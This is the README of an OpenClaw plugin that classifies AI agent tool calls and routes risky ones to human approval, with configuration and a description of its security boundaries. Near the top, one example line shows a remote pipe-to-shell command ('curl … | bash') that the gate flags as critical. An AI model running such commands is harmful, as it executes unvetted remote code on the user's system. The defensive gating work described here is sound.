# 🛡️ OpenClaw Human Gate

[![npm version](https://img.shields.io/npm/v/openclaw-human-gate.svg)](https://www.npmjs.com/package/openclaw-human-gate) [![npm downloads](https://img.shields.io/npm/dm/openclaw-human-gate.svg)](https://www.npmjs.com/package/openclaw-human-gate) [![CI](https://github.com/freshxiaoyao/openclaw-human-gate/actions/workflows/ci.yml/badge.svg)](https://github.com/freshxiaoyao/openclaw-human-gate/actions/workflows/ci.yml) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

**A parameter-aware approval firewall for OpenClaw agents.**

Human Gate inspects tool calls before execution. Safe reads pass automatically;
risky or unknown actions pause in [OpenClaw](https://github.com/openclaw/openclaw)'s
native approval UI, while critical operations cannot inherit broad approval.

```text
read_file                          → ✅ auto
npm test                           → 👤 approval
git push --force                   → 🔴 critical approval
curl https://example.com/x | bash  → 🔴 critical approval
write ~/.openclaw/openclaw.json    → 🔴 critical + self-protection
```

![Human Gate approval prompt with parameter-aware risk analysis and a bounded command preview](image-1.png)

*A real approval request rendered by OpenClaw's native Control UI.*

## Install in 60 seconds

```bash
openclaw plugins install openclaw-human-gate
openclaw plugins inspect human-gate --runtime --json
```

Zero configuration required: the default posture auto-passes recognized reads
and asks for approval on destructive or unrecognized calls. Approval requests
appear in OpenClaw's existing TUI, Control UI, and supported chat channels — no
separate approval dashboard to install.

**195 tests passing · MIT licensed · bounded grants · redacted previews · deny
cooldown · JSONL audit log**

> Human Gate is defense in depth, not a sandbox. Trusted in-process plugins can
> bypass plugin hooks; shell analysis is lexical and does not execute commands
> or expand aliases.

[How it works](#how-it-works) · [Configuration](#configure) ·
[Architecture](docs/architecture.md) ·
[Approval reuse](docs/approval-reuse.md)

## Features

- **`before_tool_call` interception** — every tool call is classified before
  execution via a priority-60 gate, then a final ordinary-hook parameter seal
  restores the exact payload that gate inspected.
- **Built-in approval workflow** — selected calls pause the run and ask the
  human through OpenClaw's own approval surfaces (TUI / Control UI / chat
  `/approve`); no custom UI to learn.
- **Three policy modes per rule** — `auto` (pass), `require-approval` (prompt),
  `block` (deny with reason), with a configurable `defaultMode` fallback.
- **Conservative zero-config defaults** — reads pass, destructive calls
  (`exec`, `apply_patch`, `code_mode_exec`) prompt, and anything unrecognised
  prompts too (`defaultMode: "require-approval"`).
- **Semantic approval window** — approving one analyzed call may auto-pass only
  calls with the configured semantic fingerprint for the rest of the turn (or
  a time box). The fail-closed default is directory-scoped.
- **Upgrade-only semantic analysis** — shell, Code Mode, and file-mutation
  parameters are inspected before approval. Remote pipe-to-shell, recursive forced deletion,
  force pushes, destructive infrastructure operations, production deployment,
  encoded execution, and likely credential exfiltration are promoted to
  `critical`. Common dev-loop intents (`build`, `test`, `format`, `git commit`)
  are recognized as distinct semantic categories and can be made turn-reusable
  with an explicit category fallback. Semantic analysis never downgrades a
  policy decision.
- **Content-aware approval previews** — command/code, write, edit, and
  `apply_patch` inputs receive bounded previews. Secrets, ANSI controls, and
  bidirectional Unicode controls are sanitized before display.
- **Bounded `allow-always` lease** — remembered decisions are session-local,
  path-bound, and expire after `allowAlwaysTtlMs` (default 4h). The native
  button still reads "allow-always"; internally it is a bounded session/task
  lease, never an unlimited grant.
- **Experimental adaptive safe-file lease** — an opt-in controller can shadow,
  suggest, or enforce a finite-use, short-lived lease for completely analyzed,
  non-destructive file writes with absolute targets. It never learns authority
  from `allow-once`, and it never applies to shell/Code Mode/network actions.
- **Auto-pass for cron / heartbeat** — scheduled runs are never blocked on an
  approval nobody can see; critical semantic risks fail immediately by default.
- **`human_gate_ask` tool** — Claude Code-style "ask the human" for
  clarification or decisions.

## How it works

OpenClaw already ships a first-class approval mechanism: a `before_tool_call`
hook may return `{ requireApproval: { ... } }`, and the Gateway handles pausing
the run, rendering the prompt in the TUI / Control UI, enforcing the timeout,
and applying the decision. `deny`, `timeout`, and `cancelled` fail closed
(blocked).

This plugin is the **policy layer** on top of that mechanism: it decides which
calls need approval, with what severity and timeout, and can remember a
path-bound `allow-always` decision per session when complete analysis supports
a narrow grant fingerprint.

## Default posture (fail-closed)

The plugin does **not** intercept every tool by default — that would be
unusable. Instead it classifies each call and prompts for anything that might
have side effects; reads pass through:

1. **User rules** (first match wins) — explicit override, optionally scoped to
   direct tool parameters with a strict one-level matcher.
2. **Built-in destructive toolKinds** — `exec`, `apply_patch`, `code_mode_exec`
   → `require-approval`.
3. **Name-token classifier** (host `toolKind` first, then the whole tool name
   split into tokens across camelCase / snake_case / kebab-case):
   - **destructive token anywhere in the name** (`write`, `delete`, `edit`,
     `remove`, `run`, `send`, `create`, `update`, …) → **require-approval** —
     checked **before** read-only tokens, so a composite name like
     `readWriteFile` or `getDeleteUser` is gated, never auto-passed
   - read-only tokens only (`read`, `get`, `list`, `search`, `fetch`, `cat`,
     …) → **auto** (pass through)
   - neither → **unknown** → falls to `defaultMode`
4. **`defaultMode`** — fallback for unrecognised tools. Defaults to
   **`require-approval`** (fail-closed: an unknown tool must be approved). Set
   to `auto` only if you accept unknown tools passing through ungated.

Disable classification with `useClassifiers: false` to rely solely on explicit
rules + `defaultMode`.

## Deny cooldown

After you explicitly **deny** an approval, matching calls auto-**block** for
a short window (`denyCooldownMs`, default 120s) instead of asking the same
question again. The cooldown is keyed by the same semantic scope as the
approval window (directory-scoped for file writes), so denying one write in a
directory cools down sibling writes but not other directories. It converts
ask → block only: it never touches auto or block decisions, never survives
the window, and a clock rollback cannot extend it. `denyCooldownMs: 0`
disables the behavior entirely.

## Self-protection (authority surface)

Recognized file-write and shell-command calls whose inspected parameters
reference the authority surface — `openclaw.json` or a path under a
non-workspace `.openclaw` directory — are escalated to a **critical approval**
(no `allow-always`) before grants and windows are consulted, so the owner can
still approve a legitimate config edit. In unattended contexts the critical
severity still fails closed. This escalation-only layer can tighten a decision
but never loosen one. Pure reads of the config are *not* escalated, and the
agent's own working area under `.openclaw/workspace` is explicitly excluded.
Self-protection is defense in depth; it does not turn unrecognized third-party
tool contracts into trusted file operations.

## Decision log

Every decision (block, auto-pass, ask, resolution) is recorded in a bounded
in-memory ring buffer (`decisionLog.maxEntries`, default 512) with a session
**digest** — never the raw session key or parameter values. Set
`decisionLog.filePath` to an absolute path (or `~/...`) for an append-only
JSONL audit trail. Recording is best-effort: a write failure never changes an
enforcement outcome.

## Auto-pass system contexts (cron / heartbeat)

Scheduled runs (cron jobs, heartbeat) have no human at the keyboard, so an
approval prompt would stall them indefinitely. By default the gate
**auto-passes non-critical approval prompts** in sessions whose key contains a matching
`:`-delimited segment — `:cron:` or `:heartbeat` (cron isolated runs and
heartbeat isolated runs — enable
`agents.defaults.heartbeat.isolatedSession: true` so heartbeat runs get their
own `<session>:heartbeat` key):

```json5
{
  autoPassSessionKeys: [":cron:", ":heartbeat"], // exact session-key segments that skip the prompt
}
```

- Auto-pass exempts **only the approval prompt** (`require-approval` calls
  proceed without waiting). **`block` rules are still enforced** — a tool the
  operator explicitly banned never runs, even in an unattended context.
- Semantically `critical` calls are blocked by default rather than silently
  executed. Set `unattendedPolicy.critical: "auto"` only to restore the legacy
  behavior for critical calls.
- Matching is **exact per `:`-delimited segment**, not substring: `:cron:`
  matches `agent:main:cron:run-1` but not `agent:x:cronx:`. Keys may be
  written with or without colons (`":cron:"`, `":heartbeat"`, `"subagent"`
  all work); a bare value matches only a standalone segment.
- Add your own segments (e.g. `:subagent:`) to auto-pass other run kinds;
  remove the defaults to gate everything again.
- Regular interactive sessions never match these, so approvals still apply
  when a human is present.

## Approval reuse (less popup fatigue)

The default turn window can reuse an approval only when complete analysis
produces the same path-scoped semantic fingerprint. Absolute file targets in
the same analyzer-verified directory set can therefore reuse approval; relative
or unknown targets ask again. Critical, partial, dynamic, or unclassified calls
never reuse authorization.

Development-loop commands such as build, test, format, and `git commit` are
classified separately but do not reuse approval under the default path-only
configuration. Category fallback is an explicit broader opt-in.

Adaptive safe-file leases are experimental and default to `off`. They are
limited to completely analyzed, non-destructive file mutations with absolute
targets, fixed expiry, and a finite use budget. They never learn authority from
`allow-once` and never cover shell, Code Mode, Git, or network actions.

See [Approval reuse and adaptive leases](docs/approval-reuse.md) for scope
semantics, development-loop configuration, lease modes, migration behavior,
and rollback guidance.

## Parameter-aware semantic analysis

The built-in analyzer registry runs after the base tool policy and before any
auto, unattended, remembered-grant, or approval-window decision. The initial
release is deliberately **upgrade-only**: analysis may require approval or
raise severity, but it never turns an approved/gated call into an automatic
pass.

The shell analyzer uses a quote-aware scanner for POSIX shell, PowerShell, and
CMD operators. It does not execute commands, expand variables, resolve aliases,
or read files. Code Mode has a separate analyzer because its `command` field is
JavaScript/TypeScript source, not a shell command.

```json5
semanticAnalysis: {
  enabled: true,
  maxCommandLength: 16384,
  maxWrapperDepth: 3,
  maxFindings: 8
},
unattendedPolicy: {
  critical: "block" // "block" | "auto"
}
```

Analyzer findings use stable IDs and are combined monotonically. A failed
analyzer requires approval and disables window reuse instead of failing open.

## Approval previews

Approval descriptions are limited by OpenClaw to 512 characters, so Human Gate
shows a prioritized excerpt rather than pretending to provide a complete diff:

- `exec` and Code Mode: command or code excerpt;
- write tools: content size, line count, and leading excerpt;
- edit tools: first old → new replacement and replacement count;
- `apply_patch`: file and line counts plus a bounded patch excerpt.

All preview content is treated as untrusted input. Secret-like assignments,
Bearer tokens, JWTs, private keys, ANSI escapes, control characters, and bidi
controls are removed or marked before the final hard length limit is applied.
Human Gate snapshots the parameters before analysis and returns that isolated
snapshot with the approval result, binding the approved preview to the input
handed back to the host. A lowest-priority parameter-sealer hook also restores
that gate-time snapshot after ordinary plugin rewrites, including in-place
mutation. OpenClaw does not expose a reserved finalizer slot: installed plugins
run as trusted in-process code, so a hostile plugin can still bypass any plugin
policy and should not be installed.

## Install

```bash
# from ClawHub / npm (once published)
openclaw plugins install openclaw-human-gate

# from a local tarball (for development)
npm pack --pack-destination /tmp
# uninstall first if an older version is installed, then install the new pack
openclaw plugins uninstall human-gate
openclaw plugins install npm-pack:/tmp/openclaw-human-gate-<version>.tgz

# inspect
openclaw plugins inspect human-gate --runtime --json
```

Requires OpenClaw `>= 2026.7.1` (Node 22.22.3+ / 24.15+ / 25.9+).

## Build

```bash
npm install
npm run build      # emits ./dist
npm run typecheck  # tsc --noEmit
npm test           # build + classifier matrix + session-state tests
```

## Configure

The plugin reads its config from OpenClaw's plugin config
(`plugins.entries.human-gate.config`). Evaluation order: user rules → built-in
destructive toolKinds → name-token classifier → `defaultMode`. See
**Default posture** above.

```json5
{
  plugins: {
    entries: {
      "human-gate": {
        enabled: true,
        config: {
          defaultMode: "require-approval", // fail-closed: unknown tools prompt
          defaultSeverity: "warning",
          defaultTimeoutMs: 300000,
          rememberAllowAlways: true,
          useClassifiers: true,
          semanticAnalysis: {
            enabled: true,
            maxCommandLength: 16384,
            maxWrapperDepth: 3,
            maxFindings: 8
          },
          previews: {
            enabled: true,
            maxDescriptionChars: 512,
            maxSectionChars: 220,
            maxLines: 12,
            maxFiles: 4,
            redactSecrets: true
          },
          unattendedPolicy: {
            critical: "block"
          },
          approvalWindow: {
            mode: "turn",
            scope: "path",
            pathFallback: "none",
            ttlMs: 300000,
            bypassCritical: true
          },
          denyCooldownMs: 120000,
          selfProtection: {
            enabled: true
          },
          decisionLog: {
            enabled: true,
            maxEntries: 512,
            // filePath: "~/.openclaw/human-gate/decisions.jsonl"  // optional audit trail
          },
          floodDetector: {
            enabled: true,
            windowMs: 60000,
            threshold: 8
          },
          rules: [
            {
              id: "process-observation-auto",
              toolName: "process",
              paramMatcher: {
                all: [{ key: "action", in: ["list", "poll", "log"] }]
              },
              mode: "auto",
              reason: "Read-only process observation"
            },
            {
              id: "session-observation-auto",
              toolNamePattern: "^(?:sessions_list|sessions_history|subagents)$",
              paramMatcher: {
                any: [
                  { key: "action", missing: true },
                  { key: "action", equals: "list" }
                ]
              },
              mode: "auto",
              reason: "Read-only session observation"
            }
          ]
        }
      }
    }
  }
}
```

### Rule fields

| field             | type                                                       | meaning                                                                 |
| ----------------- | --------------------------------------------------------- | ----------------------------------------------------------------------- |
| `id`              | string (required)                                         | Stable id; used in logs and allow-always keys.                          |
| `toolName`        | string                                                    | Exact tool name match. Omit to match any.                               |
| `toolNamePattern` | string (regex source)                                     | Matched against `toolName`; an invalid regex makes the rule non-matching and is never treated as match-all. |
| `toolKind`        | string                                                    | Match host `toolKind` (e.g. `exec`, `code_mode_exec`, `apply_patch`).   |
| `paramMatcher`    | `{all: condition[]}` or `{any: condition[]}`              | Match direct, own parameters with one bounded boolean group.           |
| `mode`            | `auto` \| `require-approval` \| `block` (required)        | Decision for a matched call.                                            |
| `severity`        | `info` \| `warning` \| `critical`                         | Shown in the approval UI. Defaults to `defaultSeverity`.               |
| `allowedDecisions`| `["allow-once","allow-always","deny"]`                    | Decisions offered to the approver.                                      |
| `timeoutMs`       | integer (1000–600000)                                     | Approval timeout. Defaults to `defaultTimeoutMs`.                       |
| `reason`          | string                                                    | Human-readable reason in the approval request / block reason.           |

Parameter conditions have exactly one operator:

- `{ key: "action", equals: "list" }` uses strict JSON-scalar equality.
- `{ key: "action", in: ["list", "poll", "log"] }` matches one member.
- `{ key: "action", missing: true }` matches only when the call has no direct,
  own property with that name.

`all` is logical AND and `any` is logical OR. Matchers are deliberately only
one level deep. Nested groups, empty arrays, extra fields, non-scalar values,
dotted/bracketed paths, and `__proto__` / `prototype` / `constructor` keys are
invalid. Invalid matchers, accessor properties, inherited values, or a missing
parameter required by `equals` / `in` make the rule non-matching. Evaluation
continues to later rules and the fail-closed built-in/default policy.

The process example therefore auto-passes only `list`, `poll`, and `log`;
`write`, `kill`, an unknown action, or a missing action does not match. The
session rule uses an exact tool-name pattern instead of a broad `sessions_*`
prefix. Separately, `session_status` with a direct `model` parameter is treated
as a state change and requires approval.

### Built-in behavior (applied when no user rule matches)

Destructive toolKinds (always gated): `exec`, `apply_patch`, `code_mode_exec`.

Name-token classifier (`useClassifiers: true`, default) — the whole tool name
is split into tokens (camelCase / snake_case / kebab-case / digits), then:
- **destructive token anywhere** → `require-approval` (checked FIRST so
  composite names like `readWriteFile`, `getDeleteUser`, `listAndRemove` are
  gated, never auto-passed): `write`, `edit`, `delete`, `remove`, `rm`, `rmdir`,
  `mkdir`, `move`, `rename`, `deploy`, `publish`, `install`, `uninstall`,
  `exec`, `run`, `apply`, `patch`, `create`, `update`, `kill`, `send`, `post`,
  `put`, `push`, `commit`, `flush`, `drop`, `truncate`, `grant`, `revoke`
- read-only tokens only → `auto`: `read`, `get`, `list`, `search`, `glob`,
  `grep`, `view`, `show`, `status`, `ping`, `fetch`, `head`, `cat`, `ls`,
  `find`, `whoami`, `echo`, `inspect`, `describe`, `explain`, `query`, `count`
- neither → unknown → `defaultMode`

Anything else → `defaultMode` (default **`require-approval`** — fail-closed).

### Approval routing

The approval prompt is delivered by the Gateway. To route it to a specific
channel (e.g. Slack DM), set the `approvals.plugin` block in OpenClaw config:

```json5
{
  approvals: {
    plugin: {
      enabled: true,
      mode: "targets",
      agentFilter: ["main"],
      targets: [{ channel: "slack", to: "U12345678" }]
    }
  }
}
```

The approval popup shows a bounded, sanitized semantic summary and a selected
command/code/file-mutation preview. It never dumps the complete params object.

In a chat channel, resolve with `/approve <id> allow-once|allow-always|deny`.

## Ask tool (`human_gate_ask`)

The plugin also registers an optional `human_gate_ask` tool the agent can call
when it needs clarification, a decision, or more context. It is the Claude Code
"ask the human" pattern.

Enable it (it is `optional`):

```json5
{ tools: { allow: ["human_gate_ask"] } }
```

Parameters: `question` (required string), `choices?` (string[]), `allowFreeText?`
(boolean, defaults to true when no choices), `context?` (string).

The tool's `execute` returns a standard `{ content, details }` result whose text
is the question + numbered choices. The agent presents it in chat and waits for
the human's reply in the next turn. The structured `details` carries
`{ question, choices, allowFreeText, context? }` for programmatic callers.

**Why no TUI popup?** OpenClaw's `requireApproval` is an allow/deny gate only —
it cannot capture a choice or free-text answer, and there is no generic
plugin-callable TUI selector API. Chat is the selector.

## Files

- `src/index.ts` — entry point; registers the approval `before_tool_call` hook,
  an `after_tool_call` observation hook, and the `human_gate_ask` tool.
- `src/decision-log.ts` — bounded in-memory decision history and optional JSONL
  audit output.
- `src/deny-cooldown.ts` — semantic-scope cooldown after an explicit denial.
- `src/self-protection.ts` — escalation-only protection for recognized calls
  targeting OpenClaw's authority surface.
- `src/policy.ts` — rule-matching engine (pure).
- `src/analysis/` — analyzer registry, quote-aware shell scanner, command,
  Code Mode, and file-mutation analyzers, plus the upgrade-only reducer.
- `src/preview/` — extensible preview providers, sanitization, redaction, and
  the OpenClaw text presenter.
- `src/config.ts` — resolves `api.pluginConfig` over built-in defaults.
- `src/state.ts` — per-session allow-always store backed by session extensions.
- `src/scope.ts` — versioned semantic fingerprints and strict path-scope normalization.
- `src/window.ts` — per-session approval window backed by session extensions.
- `src/in-memory-handle.ts` — deprecated compatibility placeholder; no process-global session state is used.
- `src/types.ts` — plugin config, rule types, and ask-tool parsing/formatting.
- `docs/architecture.md` — trust boundaries, extension contracts, invariants,
  known limitations, and the next architecture increments.
- `docs/approval-reuse.md` — approval-window scopes, semantic fingerprints,
  development-loop reuse, adaptive leases, migration, and rollback.
- The build uses the real `openclaw/plugin-sdk/*` declarations supplied by the
  peer dependency; no local SDK shim can mask compatibility drift.

## Security boundaries

- Cron and heartbeat sessions auto-pass non-critical approval prompts by
  default because no human may be present; critical semantic risks follow
  `unattendedPolicy` and block by default.
- Relative file targets do not produce reusable path authorization without a
  host-authoritative execution cwd. Use absolute tool targets when reuse is
  desired; Human Gate does not guess the workspace.
- Semantic command analysis classifies the visible invocation. Build scripts,
  test runners, formatters, Git hooks, plugins, and configuration can have
  transitive side effects that cannot be proven safe from a command name alone.
- OpenClaw currently provides no final-parameter hook. Human Gate seals the
  inspected payload with a final ordinary hook, but installed in-process
  plugins are part of the trusted host boundary and can deliberately bypass
  ordinary-hook ordering.
- Audit-file recording is optional and best-effort. Protect the configured
  destination with operating-system permissions appropriate for security logs.

## Notes

- `block: true` is terminal and skips lower-priority hooks.
- `params` rewriting (returning `{ params }`) is applied only after approval
  succeeds — useful for a future "Modify" path.
- `allow-always` grants are path-bound and scoped to a session via plugin-owned
  session extensions; they do not survive a new session. If a hook invocation
  has no trusted `sessionKey`, Human Gate does not persist a grant or approval
  window.
- Non-bundled plugins do not need `allowConversationAccess` for
  `before_tool_call`; it is only required for prompt-content hooks.
